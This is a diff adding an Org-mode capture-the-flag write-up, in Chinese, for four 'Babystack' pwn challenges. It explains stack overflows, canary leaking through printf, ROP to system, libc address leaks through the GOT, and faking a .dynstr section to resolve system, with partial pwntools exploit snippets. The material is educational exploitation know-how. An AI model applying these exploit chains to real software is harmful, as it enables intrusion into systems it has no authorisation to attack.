@@ -1,0 +1,92 @@
+* Babystack level 0
+=43 solves, 200 pts=
+
+#+NAME: back()
+[[file:./lv0_1.png]]
+
+注意到程序中存在一个 =back= 函数，且没有其它安全措施。直接利用栈溢出覆写调用栈到
+此函数即可获得 shell，再 =cat flag= 即可获得 flag。
+
+* Babystack level 1
+=22 solves, 224 pts=
+
+本题启用了 canary 保护，同时，允许我们控制 =.bss= 段上的一个变量，并且会对我们输
+入的字符串调用一次 =printf()= 。
+
+#+NAME: =babystack_level1= 的主函数
+[[file:./lv1_1.png]]
+
+通常来说，canary 总是以 =\0= 开头，这是为了截断栈上溢出的字符串。如果把 canary
+开头的这个 =\0= 覆盖掉，那么 =printf= 就会大概率将 canary 也一起打印出来（除非
+canary 后面随机部分也出现了 =\0= ）
+
+#+begin_src python
+canary_leaker = flat([b"A" for i in range(104)])
+# re.S here so that it will match everying in canary including \n
+canary_finder = re.compile(rb".*A{104}(.{8})", re.S)
+c.sendline(canary_leaker)
+response = c.recv()
+canary = canary_finder.match(response).group(1)
+canary = dd(canary, '\0', count=1) # recover the first NULL byte
+#+end_src
+
+得到 canary 之后，注意到程序中存在对 =system= 的调用。于是利用 ROP 将 name 所在
+的地址写入 rdi 寄存器，再跳转到 =system= 调用处即可执行任意命令。
+
+#+NAME: 对 =system= 的调用
+[[./lv1_2.png]]
+
+
+* Baby stack level 2
+=16 solves, 351 pts=
+
+本题的导入符号表中不再含有 =system= ，但是通过 ROP 调用 =puts= 函数可以将 =.got.plt=
+段保存的 =puts getchar setbuf= 等函数的地址打印出来。
+
+#+begin_src python
+libc_leaker = pad + p64(gad_addr) + \ # pop rdi, ret gadget
+                    p64(got) + \ # offset in got table
+                    p64(puts_plt) + p64(run_addr) # return to run() function, receive input again
+#+end_src
+
+得到这几个地址后，通过 [[https://libc.blukat.me/?q=puts%3A7f5bb52376a0%2Cgetchar%3A7f5bb523e170%2Csetbuf%3A7f5bb523e6c0][libc database]] 查找可能的 libc 版本。经过尝试，可以利用
+=libc6_2.23-0ubuntu11.3_amd64= 的偏移量信息算出 =system= 和 =/bin/sh= 字符串的地
+址，从而获取 flag。
+
+* Baby stack level 3
+=9 solves, 586 pts=
+
+本题的程序没有导入任何输出函数，同时， =read_in= 的实现也限制了栈溢出深度的上界。
+
+#+NAME: 主程序和 =read_in= 函数
+[[./lv3_1.png]]
+
+另外， =checksec= 发现程序关闭了 RELRO，因此可以覆盖程序的动态符号表。
+
+#+begin_src
+[*] '/home/ocean/Ghidra/babystack_lv3/babystack_level3'
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+#+end_src
+
+在正常情况下，PLT 表中每项的第二、三条指令负责调用动态链接器来向 GOT 表写入正确
+的函数地址。而动态链接器需要 =.dynamic= 段中的字符串表来确定所要查找函数的名称。
+可以自己做一份假 =.dynstr= 段，让动态链接器来寻找 =system= 的地址：
+
+#+begin_src python
+dynstr = elf.get_section_by_name('.dynstr').data()
+dynstr = dynstr.replace(b"setbuf",b"system")
+# we dont have gadget for "rdx", but conveniently it is still 0x110
+rop({"rdi": 0, "rsi": 0x600930})
+rop.read() # overwrite address of .dynstr in .dynamic
+rop({"rdi": cmd_adr}) # pointer in `name` to `cat flag\0`
+rop.raw(0x4004b6) # setbuf@plt + 6
+#+end_src
+
+但是，在栈上至多只能溢出两个 64 位字，可以利用 =leave= 指令，将栈指针转移到已知
+绝对地址且可以控制的 =.bss= 段 =name= 的内存中，再构造之前描述的 ROP 链。
+
+完整代码见 [[id:29c6d857-5b0e-477a-a4ee-2801b52dc83a][=lv3.py=]]。
